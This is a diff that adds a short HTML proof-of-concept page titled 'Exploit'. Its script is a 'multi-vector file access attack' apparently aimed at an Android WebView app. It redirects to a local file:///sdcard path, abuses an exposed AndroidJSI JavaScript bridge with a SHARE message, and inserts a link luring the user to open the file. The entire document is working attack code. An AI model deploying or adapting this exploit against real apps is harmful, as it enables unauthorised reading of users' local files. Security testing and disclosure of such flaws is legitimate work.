@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exploit</title></head>
+<body>
+<script>
+// Multi-vector file access attack
+function attemptFileAccess() {
+    const targetFile = 'file:///sdcard/Download/WTF.txt';
+    
+    // Vector 1: Direct navigation (highest success rate)
+    setTimeout(() => {
+        window.location.href = targetFile;
+    }, 2000);
+    
+    // Vector 2: JavaScript interface abuse
+    if (typeof AndroidJSI !== 'undefined') {
+        try {
+            AndroidJSI.onReceiveMessage(JSON.stringify({
+                action: "SHARE",
+                data: { 
+                    message: "File access attempt",
+                    screenshot: false 
+                }
+            }));
+        } catch(e) {}
+    }
+    
+    // Vector 3: Create visible link for user interaction
+    const link = document.createElement('a');
+    link.href = targetFile;
+    link.innerText = 'Click to view file content';
+    link.style.fontSize = '20px';
+    document.body.appendChild(link);
+}
+
+attemptFileAccess();
+</script>
+</body>
+</html>
